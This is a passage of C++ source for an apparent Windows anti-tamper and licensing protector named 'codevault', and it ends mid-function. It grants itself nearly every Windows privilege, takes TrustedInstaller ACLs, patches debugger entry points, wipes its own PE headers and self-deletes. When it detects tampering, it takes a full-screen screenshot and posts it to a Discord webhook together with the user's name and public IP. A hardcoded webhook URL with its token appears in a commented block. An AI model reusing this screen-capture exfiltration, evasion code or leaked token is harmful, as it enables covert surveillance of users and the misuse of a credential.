#include <cstdlib>
#include <Lmcons.h>
#include <filesystem>
#include <string>
#include <fstream>
#include <iostream>
#include <mutex>
#include <string>
#include <ctime>
#include <iomanip>
#include <Windows.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <AclAPI.h>
#include <sddl.h> 
#include <wincodec.h>
#include <wininet.h>
#include "winnt.h"
#include <thread>
#include <functional>
#include <intrin.h>
#include <strsafe.h>
#include <AccCtrl.h>
#include <condition_variable>
#include <mutex>
#include "Shlwapi.h"
#include "tchar.h"
#include "Psapi.h"
#include "integ.h"
#include "peb.h"
#include "hash.h"
#include "codevault.h"



#define secure __forceinline
#define Hide_Function() try { int* __INVALID_ALLOC__ = new int[(std::size_t)std::numeric_limits<std::size_t>::max]; } catch (const std::bad_alloc&) {
#define Hide_Function_End() }

typedef void(*CallOEPInt2)();
CallOEPInt2 OrginalEp;

using namespace std;

integrity::check integrityChecker;

typedef void(*OriginalEntryPointType)();
static uintptr_t SavedOriginalEPAddr = 0;
static OriginalEntryPointType OriginalEntryPoint = nullptr;
static OriginalEntryPointType TrampolineEntryPoint = nullptr;
static BYTE OriginalBytes[14] = { 0 };

typedef struct _THREAD_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PVOID TebBaseAddress;
    MY_CLIENT_ID ClientId;
    ULONG AffinityMask;
    LONG Priority;
    LONG BasePriority;
    ULONG SuspendCount;
} THREAD_BASIC_INFORMATION, * PTHREAD_BASIC_INFORMATION;





typedef NTSTATUS(__stdcall* CheckQueryInformationProcess)(_In_ HANDLE, _In_  unsigned int, _Out_ PVOID, _In_ ULONG, _Out_ PULONG);

string User_Key;
wstring webhook_link = L".";
volatile std::uint64_t set = 0;
bool tls_ran = false;
bool flag = false;
bool active = false;
bool authorized = false;
bool thread1_started = false;
bool thread_starter_called = false;
bool gettick = false;
bool var_is_valid = false;
bool main_called = false;
bool Protected_Thread_Started = false;
bool ban_system = false;
bool imgui = true;
int times;
int time1 = 0;
int start = 0;
int end = 0;
int called = 0;
int start2 = 0;
#define ThreadIsCritical  0x1
#define ThreadIsCritical2  0x11


HWND Imgui_Window = NULL;

DWORD Protected_ThreadID = 0;

HANDLE Thread1 = 0;

DWORD64 InitialRip = 0;

LPVOID var_memory;
PSAPI_WORKING_SET_EX_INFORMATION var_information = { 0 };
BYTE multiByte[] = { 0xCD, 0x90, 0xCD, 0x03, 0xCD, 0x90 };

typedef NTSTATUS(NTAPI* pdef_NtSetInformationThread)(HANDLE, THREAD_INFORMATION_CLASS, PVOID, ULONG);
typedef EXECUTION_STATE(WINAPI* pdef_SetThreadExecutionState)(EXECUTION_STATE);
typedef VOID(NTAPI* pdef_RtlSetThreadIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN);
typedef BOOL(WINAPI* pdef_ImpersonateSelf)(SECURITY_IMPERSONATION_LEVEL);

std::vector<DWORD> Protected_Threads;

using namespace KeyAuth;
std::string Generate_Exe_Name(size_t length)
{
    const std::string charset = Encrypt("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789");
    std::random_device rd;
    std::mt19937 generator(rd());
    std::uniform_int_distribution<> dist(Encrypt(0), charset.size() - Encrypt(1));

    std::string randomStr;
    for (size_t i = false; i < length; ++i)
    {
        randomStr += charset[dist(generator)];
    }
    return randomStr + Encrypt(".exe");
}

void CheckDebuggerOnLoad(const char* filePath)
{
    if (Imports.load_library(filePath))
    {
        HANDLE hFile = Lazy(CreateFileA).get()(filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    }
}

void CheckAllSystem32Executables()
{
    const char* system32Path = "C:\\Windows\\System32\\";
    WIN32_FIND_DATA findFileData;
    HANDLE hFind = FindFirstFile(std::string(system32Path + std::string("*.*")).c_str(), &findFileData);

    if (hFind == INVALID_HANDLE_VALUE)
    {
        std::cerr << "Unable to find files in System32 directory" << std::endl;
        return;
    }

    do
    {
        if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            continue;

        std::string filePath = system32Path + std::string(findFileData.cFileName);

        if (filePath.substr(filePath.find_last_of(".") + 1) == "exe" || filePath.substr(filePath.find_last_of(".") + 1) == "dll")
        {
            CheckDebuggerOnLoad(filePath.c_str());
        }

    } while (FindNextFile(hFind, &findFileData) != 0);

    FindClose(hFind);
}

std::string GetExecutablePath()
{
    char buffer[MAX_PATH];
    DWORD size = Imports.get_function<DWORD(*)(HMODULE, LPSTR, DWORD)>(Encrypt("kernel32.dll"), Encrypt("GetModuleFileNameA"))(nullptr, buffer, MAX_PATH);
    return std::string(buffer);
}

void RenameExecutable()
{
    std::string currentPath = GetExecutablePath();
    size_t lastSlashPos = currentPath.find_last_of(Encrypt("\\/"));
    std::string directory = currentPath.substr(Encrypt(0), lastSlashPos + Encrypt(1));
    std::string newPath = directory + Generate_Exe_Name(Encrypt(16));
    Lazy(MoveFileA).get()(currentPath.c_str(), newPath.c_str());
}
auto SetPrivilege(LPCWSTR privilegeName, BOOL enable)
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (OpenProcessToken(Imports.get_current_process(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        if (LookupPrivilegeValueW(NULL, privilegeName, &luid))
        {
            tp.PrivilegeCount = Encrypt(1);
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = enable ? SE_PRIVILEGE_ENABLED : 0;
            AdjustTokenPrivileges(hToken, Encrypt(0), &tp, sizeof(tp), NULL, NULL);
        }
        Lazy(CloseHandle).get()(hToken);
    }
}

void TrustInstallerPermissions()
{
    HANDLE hProcess = Imports.get_current_process();
    char exePath[MAX_PATH];
    GetModuleFileNameExA(hProcess, NULL, exePath, MAX_PATH);
    PSECURITY_DESCRIPTOR pSD = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
    InitializeSecurityDescriptor(pSD, SECURITY_DESCRIPTOR_REVISION);
    PSID pTrustedInstallerSID = NULL;
    ConvertStringSidToSidA(Encrypt("S-1-5-80-0"), &pTrustedInstallerSID);
    EXPLICIT_ACCESS ea;
    ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
    ea.grfAccessPermissions = GENERIC_ALL;
    ea.grfAccessMode = SET_ACCESS;
    ea.grfInheritance = NO_INHERITANCE;
    ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
    ea.Trustee.TrusteeType = TRUSTEE_IS_USER;
    ea.Trustee.ptstrName = (LPSTR)pTrustedInstallerSID;
    PACL pACL = NULL;
    DWORD res = SetEntriesInAcl(1, &ea, NULL, &pACL);
    SetSecurityDescriptorDacl(pSD, Encrypt(1), pACL, Encrypt(0));
    SetNamedSecurityInfoA(exePath, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL);
    LocalFree(pSD);
    LocalFree(pACL);
    FreeSid(pTrustedInstallerSID);
}

secure auto NoAccess()
{
    SYSTEM_INFO systemInfo;
    Lazy(GetSystemInfo).forwarded_safe_cached()(&systemInfo);
    size_t page_size = static_cast<size_t>(systemInfo.dwPageSize);
    void* memory = Imports.virtual_alloc(nullptr, page_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    DWORD oldProtect;
    Imports.virtual_protect(memory, page_size, PAGE_NOACCESS, &oldProtect);
}


secure auto Wipe_Section_Infomation()
{
    DWORD oldHeader;
    auto base = reinterpret_cast<uint64_t>(Imports.get_module_handleA(nullptr)); if (!base) return;
    auto dos = reinterpret_cast<PIMAGE_DOS_HEADER>(base);
    auto nt = reinterpret_cast<PIMAGE_NT_HEADERS64>(base + dos->e_lfanew);
    auto nt_copy = reinterpret_cast<PIMAGE_NT_HEADERS64>(Lazy(malloc).forwarded_safe_cached()(sizeof(IMAGE_NT_HEADERS64)));
    auto section = IMAGE_FIRST_SECTION(nt);
    for (uint32_t i = Encrypt(0); i < nt->FileHeader.NumberOfSections; i++, section++)
    {
        DWORD oldSection;
        Imports.virtual_protect(section, sizeof(*section), PAGE_EXECUTE_READWRITE, &oldSection);
        section->Name[0] = (rand() & Encrypt(0xff));
        section->Name[1] = Encrypt('\0');
        section->Characteristics = Encrypt(0);
        section->Misc.VirtualSize = Encrypt(0);
        section->VirtualAddress = Encrypt(0);
        section->PointerToRawData = Encrypt(0);
        section->SizeOfRawData = Encrypt(0);
        Imports.virtual_protect(section, sizeof(*section), oldSection, &oldSection);
    }

    Imports.import_memcpy(nt_copy, nt, sizeof(IMAGE_NT_HEADERS64));
    Imports.import_memset(nt_copy, Encrypt(0), sizeof(IMAGE_NT_HEADERS64));
    Imports.virtual_protect(nt, sizeof(IMAGE_NT_HEADERS64), PAGE_EXECUTE_READWRITE, &oldHeader);
    nt->FileHeader.Machine = Encrypt(0);
    nt->FileHeader.TimeDateStamp = Encrypt(0);
    nt->FileHeader.PointerToSymbolTable = Encrypt(0);
    nt->FileHeader.NumberOfSymbols = Encrypt(0);
    nt->FileHeader.SizeOfOptionalHeader = Encrypt(0);
    nt->FileHeader.Characteristics = Encrypt(0);
    nt->OptionalHeader.ImageBase = Encrypt(0);
    nt->OptionalHeader.SizeOfImage = Encrypt(0);
    nt->OptionalHeader.SizeOfHeaders = Encrypt(0);
    Imports.virtual_protect(nt, sizeof(IMAGE_NT_HEADERS64), oldHeader, &oldHeader);
    Lazy(free).forwarded_safe_cached()(nt_copy);
}

bool SelfDelete()
{
    WCHAR wcPath[MAX_PATH + 1];
    WCHAR wcCopyPath[MAX_PATH + 1];
    ZeroMemory(wcPath, sizeof(wcPath));
    ZeroMemory(wcCopyPath, sizeof(wcCopyPath));

    if (!Lazy(GetModuleFileNameW).forwarded_safe_cached()(NULL, wcPath, MAX_PATH))
    {
        return false;
    }

    wcscpy_s(wcCopyPath, MAX_PATH, wcPath);
    WCHAR* lastSlash = wcsrchr(wcCopyPath, Encrypt(L'\\'));
    if (lastSlash)
    {
        wcscpy_s(lastSlash + 1, MAX_PATH - (lastSlash - wcCopyPath), Encrypt(L"Loader.exe"));
    }

    if (!Lazy(CopyFileW).forwarded_safe_cached()(wcPath, wcCopyPath, FALSE))
    {
        return false;
    }

    HANDLE hCurrent = Lazy(CreateFileW).forwarded_safe_cached()(wcPath, DELETE, FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hCurrent == INVALID_HANDLE_VALUE)
    {
        return false;
    }

    FILE_RENAME_INFO* fRename;
    LPWSTR lpwStream = const_cast<LPWSTR>(Encrypt(L":codevault.enc"));
    DWORD bslpwStream = (DWORD)(wcslen(lpwStream)) * sizeof(WCHAR);
    DWORD bsfRename = sizeof(FILE_RENAME_INFO) + bslpwStream;
    fRename = (FILE_RENAME_INFO*)malloc(bsfRename);
    if (fRename == nullptr)
    {
        Lazy(CloseHandle).forwarded_safe_cached()(hCurrent);
        return false;
    }
    ZeroMemory(fRename, bsfRename);
    fRename->FileNameLength = bslpwStream;
    Imports.import_memcpy(fRename->FileName, lpwStream, bslpwStream);

    if (!SetFileInformationByHandle(hCurrent, FileRenameInfo, fRename, bsfRename))
    {
        free(fRename);
        Lazy(CloseHandle).forwarded_safe_cached()(hCurrent);
        return false;
    }
    free(fRename);
    Lazy(CloseHandle).forwarded_safe_cached()(hCurrent);

    hCurrent = Lazy(CreateFileW).forwarded_safe_cached()(wcPath, DELETE, FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hCurrent == INVALID_HANDLE_VALUE)
    {
        return false;
    }

    FILE_DISPOSITION_INFO fDelete;
    ZeroMemory(&fDelete, sizeof(fDelete));
    fDelete.DeleteFile = TRUE;
    if (!SetFileInformationByHandle(hCurrent, FileDispositionInfo, &fDelete, sizeof(fDelete)))
    {
        Lazy(CloseHandle).forwarded_safe_cached()(hCurrent);
        return false;
    }

    Lazy(CloseHandle).forwarded_safe_cached()(hCurrent);
    return true;
}

auto SetPrivileges()
{
    __security_init_cookie();
    CALL(&SetPrivilege, Encrypt(L"SeDebugPrivilege"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeChangeNotifyPrivilege"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeShutdownPrivilege"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeSystemtimePrivilege"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeRemoteShutdownPrivilege"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeBackupPrivilege"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeRestorePrivilege"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeTakeOwnershipPrivilege"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeIncreaseQuotaPrivilege"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeLockMemoryPrivilege"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeManageVolumePrivilege"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeCreateSymbolicLinkPrivilege"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeEnableDelegationPrivilege"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeImpersonatePrivilege"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeCreateTokenPrivilege"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeAssignPrimaryTokenPrivilege"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeUnsolicitedInputPrivilege"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeMachineAccountPrivilege"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeTcbPrivilege"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeSecurityPrivilege"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeLoadDriverPrivilege"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeSystemProfilePrivilege"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeProfSingleProcessPrivilege"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeIncBasePriorityPrivilege"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeCreatePagefilePrivilege"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeCreatePermanentPrivilege"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeAuditPrivilege"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeSystemEnvironmentPrivilege"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeUndockPrivilege"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeSyncAgentPrivilege"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeCreateGlobalPrivilege"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeTrustedCredmanAccessPrivilege"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeRelabelPrivilege"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeIncWorkingSetPrivilege"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeTimeZonePrivilege"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeDelegateSessionUserImpersonatePrivilege"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeInteractiveLogonPrivilege"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeNetworkLogonRight"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeBatchLogonRight"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeServiceLogonRight"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeRemoteInteractiveLogonRight"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeDenyInteractiveLogonRight"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeDenyNetworkLogonRight"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeDenyBatchLogonRight"), Encrypt(1));
    CALL(&SetPrivilege, Encrypt(L"SeDenyServiceLogonRight"), Encrypt(1));

    TrustInstallerPermissions(); // needs to be last since we need some of those to even do this
}

auto ProtectProcess()
{
    HANDLE handle = Imports.get_current_process();
    DWORD aclSize = sizeof(ACL) + sizeof(ACCESS_DENIED_ACE) + GetSidLengthRequired(1);
    PACL pDacl = (PACL)new BYTE[aclSize];
    ZeroMemory(pDacl, aclSize);
    InitializeAcl(pDacl, aclSize, ACL_REVISION);
    PSID pSpecificSid = NULL;
    SID_IDENTIFIER_AUTHORITY SIDAuth = SECURITY_NT_AUTHORITY;
    AllocateAndInitializeSid(&SIDAuth, 1, SECURITY_LOCAL_SYSTEM_RID, Encrypt(0), Encrypt(0), Encrypt(0), Encrypt(0), Encrypt(0), Encrypt(0), Encrypt(0), &pSpecificSid);
    AddAccessDeniedAce(pDacl, ACL_REVISION, DELETE | READ_CONTROL | WRITE_DAC | WRITE_OWNER | SYNCHRONIZE, pSpecificSid);
    FreeSid(pSpecificSid);
    SECURITY_DESCRIPTOR sd;
    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
    SetSecurityDescriptorDacl(&sd, TRUE, pDacl, Encrypt(0));
    PSID integritySid = NULL;
    SID_IDENTIFIER_AUTHORITY integrityAuthority = SECURITY_MANDATORY_LABEL_AUTHORITY;
    AllocateAndInitializeSid(&integrityAuthority, Encrypt(1), SECURITY_MANDATORY_MEDIUM_RID, Encrypt(0), Encrypt(0), Encrypt(0), Encrypt(0), Encrypt(0), Encrypt(0), Encrypt(0), &integritySid);
    DWORD saclSize = sizeof(ACL) + sizeof(ACCESS_ALLOWED_ACE) + GetLengthSid(integritySid);
    PACL pSacl = (PACL)new BYTE[saclSize];
    ZeroMemory(pSacl, saclSize);
    InitializeAcl(pSacl, saclSize, ACL_REVISION);
    AddAccessAllowedAce(pSacl, ACL_REVISION, PROCESS_ALL_ACCESS, integritySid);
    SetSecurityDescriptorSacl(&sd, TRUE, pSacl, Encrypt(0));
    SetKernelObjectSecurity(handle, DACL_SECURITY_INFORMATION | LABEL_SECURITY_INFORMATION, &sd);
    delete[] pDacl;
    delete[] pSacl;
    FreeSid(integritySid);
    HANDLE hProcess = Imports.get_current_process();
    HMODULE hMod = Imports.get_module_handleW(Encrypt(L"ntdll.dll"));
    FARPROC func_DbgUiRemoteBreakin = Imports.get_proc_address(hMod, Encrypt("DbgUiRemoteBreakin"));
    Lazy(WriteProcessMemory).get()(hProcess, func_DbgUiRemoteBreakin, (0), Encrypt(6), NULL);
    Lazy(DebugActiveProcessStop).get()(Imports.get_current_process_id());
}


bool IsVaildFormat(const std::string& str)
{
    Hide_Function();
    std::regex pattern(Encrypt("codevault-[a-zA-Z0-9]{4}"));
    return std::regex_match(str, pattern);
    Hide_Function_End();
}



std::string getUserName()
{
    char userName[UNLEN + 1];
    DWORD size = sizeof(userName) / sizeof(userName[Encrypt(0)]);
    if (Lazy(GetUserNameA).get()(userName, &size)) 
    {
        return Encrypt("User -> ") + std::string(userName);
    }
    else {
        return Encrypt("User -> Unaccessable User");
    }
}

std::string getCurrentTime() 
{
    std::time_t now = std::time(nullptr);
    struct tm timeInfo;
    char buffer[80];

    if (localtime_s(&timeInfo, &now) == 0) 
    {
        std::strftime(buffer, sizeof(buffer), Encrypt("%Y-%m-%d %H:%M:%S"), &timeInfo);
        return std::string(buffer);
    }
    else 
    {
        return Encrypt(" ");
    }
}

bool CaptureScreenshotToMemory(std::vector<BYTE>& buffer)
{
    IWICImagingFactory* pFactory = nullptr;
    IWICBitmap* pWICBitmap = nullptr;
    IWICBitmapEncoder* pEncoder = nullptr;
    IWICBitmapFrameEncode* pFrame = nullptr;
    IWICStream* pStream = nullptr;

    HRESULT hr = CoInitialize(NULL);
    if (FAILED(hr))
    {
        return false;
    }

    hr = CoCreateInstance(CLSID_WICImagingFactory, NULL, CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&pFactory));
    if (FAILED(hr)) 
    {
        CoUninitialize();
        return false;
    }

    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    HDC hdcScreen = GetDC(NULL);
    HDC memoryDC = CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
    SelectObject(memoryDC, hBitmap);
    BitBlt(memoryDC, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);

    hr = pFactory->CreateBitmapFromHBITMAP(hBitmap, NULL, WICBitmapUseAlpha, &pWICBitmap);
    if (FAILED(hr)) 
    {
        DeleteObject(hBitmap);
        DeleteDC(memoryDC);
        ReleaseDC(NULL, hdcScreen);
        pFactory->Release();
        CoUninitialize();
        return false;
    }

    hr = pFactory->CreateStream(&pStream);
    if (FAILED(hr)) 
    {
        DeleteObject(hBitmap);
        DeleteDC(memoryDC);
        ReleaseDC(NULL, hdcScreen);
        pWICBitmap->Release();
        pFactory->Release();
        CoUninitialize();
        return false;
    }

    const size_t initialBufferSize = 4 * 1024 * 1024; // Pre-allocate 4MB memory buffer
    buffer.resize(initialBufferSize);
    hr = pStream->InitializeFromMemory(buffer.data(), static_cast<DWORD>(buffer.size()));
    if (FAILED(hr)) 
    {
        DeleteObject(hBitmap);
        DeleteDC(memoryDC);
        ReleaseDC(NULL, hdcScreen);
        pStream->Release();
        pWICBitmap->Release();
        pFactory->Release();
        CoUninitialize();
        return false;
    }

    hr = pFactory->CreateEncoder(GUID_ContainerFormatPng, NULL, &pEncoder);
    if (SUCCEEDED(hr))
    {
        hr = pEncoder->Initialize(pStream, WICBitmapEncoderNoCache);
    }
    if (FAILED(hr)) 
    {
        DeleteObject(hBitmap);
        DeleteDC(memoryDC);
        ReleaseDC(NULL, hdcScreen);
        pStream->Release();
        pWICBitmap->Release();
        pFactory->Release();
        CoUninitialize();
        return false;
    }

    hr = pEncoder->CreateNewFrame(&pFrame, NULL);
    if (SUCCEEDED(hr)) 
    {
        hr = pFrame->Initialize(NULL);
    }
    if (SUCCEEDED(hr)) 
    {
        hr = pFrame->WriteSource(pWICBitmap, NULL);
    }
    if (SUCCEEDED(hr))
    {
        hr = pFrame->Commit();
    }
    if (SUCCEEDED(hr)) 
    {
        hr = pEncoder->Commit();
    }

    if (FAILED(hr)) 
    {
    }
    else {

        STATSTG stats;
        hr = pStream->Stat(&stats, STATFLAG_NONAME);
        if (SUCCEEDED(hr)) {
            buffer.resize(stats.cbSize.QuadPart);
        }
    }

    DeleteObject(hBitmap);
    DeleteDC(memoryDC);
    ReleaseDC(NULL, hdcScreen);

    if (pFrame) pFrame->Release();
    if (pEncoder) pEncoder->Release();
    if (pStream) pStream->Release();
    if (pWICBitmap) pWICBitmap->Release();
    if (pFactory) pFactory->Release();

    CoUninitialize();
    return SUCCEEDED(hr);
}



std::string getPublicIP()
{
    HINTERNET hSession = WinHttpOpen(Encrypt(L"codevault_Api"), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, Encrypt(0));
    HINTERNET hConnect = WinHttpConnect(hSession,Encrypt(L"api.ipify.org"),INTERNET_DEFAULT_HTTP_PORT, Encrypt(0));
    if (!hConnect)
    {
        WinHttpCloseHandle(hSession);
        return Encrypt("Unaccessable Ip Address");
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, Encrypt(L"GET"), NULL,NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,  Encrypt(0));
    if (!hRequest)
    {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return Encrypt("Unaccessable Ip Address");
    }

    BOOL bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, Encrypt(0), WINHTTP_NO_REQUEST_DATA,Encrypt(0),Encrypt(0),Encrypt(0));

    if (!bResults || !WinHttpReceiveResponse(hRequest, NULL))
    {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return Encrypt("Unaccessable Ip Address");
    }

    DWORD dwSize = Encrypt(0);
    WinHttpQueryDataAvailable(hRequest, &dwSize);
    if (dwSize == Encrypt(0))
    {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return Encrypt("Unaccessable Ip Address");
    }

    char* buffer = new char[dwSize + Encrypt(1)];
    ZeroMemory(buffer, dwSize + Encrypt(1));

    DWORD dwDownloaded = Encrypt(0);
    WinHttpReadData(hRequest, (LPVOID)buffer, dwSize, &dwDownloaded);

    std::string publicIP(buffer);
    delete[] buffer;

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return publicIP;
}

std::wstring ConvertToWideString(const std::string& narrowString)
{
    int wideCharCount = MultiByteToWideChar(CP_UTF8, 0, narrowString.c_str(), -1, nullptr, 0);
    if (wideCharCount == 0) 
    {
        return Encrypt(L"");
    }
    std::wstring wideString(wideCharCount, 0);
    MultiByteToWideChar(CP_UTF8, 0, narrowString.c_str(), -1, &wideString[0], wideCharCount);
    return wideString;
}

void Send_Log(const std::string& detection_reason, bool my)
{
    HINTERNET hSession = 0;
    HINTERNET hConnect = 0;
    HINTERNET hRequest = 0;

    if (my && main_called)
    {
        /*hSession = WinHttpOpen(Encrypt(L"codevault_Api"), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, Encrypt(0));
        hConnect = WinHttpConnect(hSession, Encrypt(L"discord.com"), INTERNET_DEFAULT_HTTPS_PORT, Encrypt(0));
        hRequest = WinHttpOpenRequest(hConnect, Encrypt(L"POST"), Encrypt(L"/api/webhooks/1330386950879838258/4tqd2WO8pEgVJw-s57KfM7ZqrGFvLr9e1culdV8pWI_tLws32oXNBadg76Zvod1iDn_a/queue"), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);

        std::string userName = getUserName();
        std::string detectionMessage = detection_reason;
        std::string desc = userName + Encrypt("\\n Ip Address -> ") + getPublicIP() + Encrypt("\\n Detection -> ") + detectionMessage + Encrypt("\\n License -> ") + User_Key;
        std::string title = Encrypt("codevault Integrity Violation");
        std::string color = Encrypt("8388736");
        std::string time_of_detection = getCurrentTime();

        std::vector<BYTE> screenshotBuffer;
        bool screenshotCaptured = CaptureScreenshotToMemory(screenshotBuffer);

        std::string boundary = Encrypt("----codevaultBoundary");
        std::string body;

        body += Encrypt("--") + boundary + Encrypt("\r\n");
        body += Encrypt("Content-Disposition: form-data; name=\"payload_json\"\r\n\r\n");
        body += Encrypt("{");
        body += Encrypt("\"username\": \"codevault Protection\",");
        body += Encrypt("\"embeds\": [{");
        body += Encrypt("\"title\": \"") + title + Encrypt("\",");
        body += Encrypt("\"description\": \"") + desc + Encrypt("\",");
        body += Encrypt("\"footer\": {\"text\": \"") + time_of_detection + Encrypt("\"},");
        body += Encrypt("\"color\": ") + color;
        body += Encrypt("}]}");
        body += Encrypt("\r\n");

        if (screenshotCaptured)
        {
            body += Encrypt("--") + boundary + Encrypt("\r\n");
            body += Encrypt("Content-Disposition: form-data; name=\"file\"; filename=\"screenshot.png\"\r\n");
            body += Encrypt("Content-Type: image/png\r\n\r\n");
            body.append(reinterpret_cast<const char*>(screenshotBuffer.data()), screenshotBuffer.size());
            body += Encrypt("\r\n");
        }

        body += Encrypt("--") + boundary + Encrypt("--\r\n");

        std::string headers = Encrypt("Content-Type: multipart/form-data; boundary=") + boundary;
        std::wstring wideHeaders = ConvertToWideString(headers);

        BOOL bResults = WinHttpSendRequest(hRequest, wideHeaders.c_str(), (DWORD)-1L, (LPVOID)body.c_str(), (DWORD)body.length(), (DWORD)body.length(), Encrypt(0));

        if (bResults)
        {
            WinHttpReceiveResponse(hRequest, NULL);
        }*/

        //WinHttpCloseHandle(hRequest);
        //WinHttpCloseHandle(hConnect);
        //WinHttpCloseHandle(hSession);
    }
    if (webhook_link != Encrypt(L".") && main_called)
    {

        hSession = WinHttpOpen(Encrypt(L"codevault_Api"), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, Encrypt(0));
        hConnect = WinHttpConnect(hSession, Encrypt(L"discord.com"), INTERNET_DEFAULT_HTTPS_PORT, Encrypt(0));
        hRequest = WinHttpOpenRequest(hConnect, Encrypt(L"POST"), webhook_link.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);


        std::string userName = getUserName();
        std::string detectionMessage = detection_reason;
        std::string desc = userName + Encrypt("\\n Ip Address -> ") + getPublicIP() + Encrypt("\\n Detection -> ") + detectionMessage;
        std::string title = Encrypt("codevault Integrity Violation");
        std::string color = Encrypt("16705372");
        std::string time_of_detection = getCurrentTime();

        std::vector<BYTE> screenshotBuffer;
        bool screenshotCaptured = CaptureScreenshotToMemory(screenshotBuffer);

        std::string boundary = Encrypt("----codevaultBoundary");
        std::string body;

        body += Encrypt("--") + boundary + Encrypt("\r\n");
        body += Encrypt("Content-Disposition: form-data; name=\"payload_json\"\r\n\r\n");
        body += Encrypt("{");
        body += Encrypt("\"username\": \"codevault Protection\",");
        body += Encrypt("\"embeds\": [{");
        body += Encrypt("\"title\": \"") + title + Encrypt("\",");
